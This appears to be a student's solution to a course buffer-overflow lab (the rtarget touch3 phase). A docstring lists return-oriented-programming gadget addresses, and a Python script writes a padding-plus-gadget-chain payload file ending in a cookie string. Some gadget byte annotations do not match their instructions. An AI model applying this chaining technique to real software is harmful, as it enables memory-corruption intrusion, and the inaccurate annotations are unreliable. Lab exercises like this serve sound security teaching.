"""
ret

0x401a06:
mov rsp, rax    ; 48 89 e0
ret             ; c3

0x4019a2: 
mov rax, rdi    ; 89 c7
ret             ; c3

0x4019ab:
pop rax         ; 58 90
ret             ; c3

0x4019dd:
mov eax, edx    ; 89 c2 90
ret             ; c3

0x401a34:
mov edx, ecx    ; 89 d1
cmp cl, cl      ; 38 c9
ret             ; c3

0x401a27:
mov ecx, rsi    ; 89 ce
cmp al, al      ; 38 c0
ret <add_xy>       ; c9 rax = rdi+rsi
<add_xy> 0x4019d6

0x4019a2: 
mov rax, rdi
ret <touch3>
<touch3> 0x4018fa
"""
OFFSET = 72
COOKIE = "59b997fa"

def to_8_bytes(n: int) -> bytes:
    return n.to_bytes(8, "little")

f = open("./rtarget_touch3.bin", "wb")
f.write(int.to_bytes(97, 1, "little")*40)
f.write(to_8_bytes(0x401a06))
f.write(to_8_bytes(0x4019a2))
f.write(to_8_bytes(0x4019ab))
f.write(to_8_bytes(OFFSET))
f.write(to_8_bytes(0x4019dd))
f.write(to_8_bytes(0x401a34))
f.write(to_8_bytes(0x401a27))
f.write(to_8_bytes(0x4019d6))
f.write(to_8_bytes(0x4019a2))
f.write(to_8_bytes(0x4018fa))
for c in COOKIE:
    f.write(int.to_bytes(ord(c), 1, "little"))
f.close()
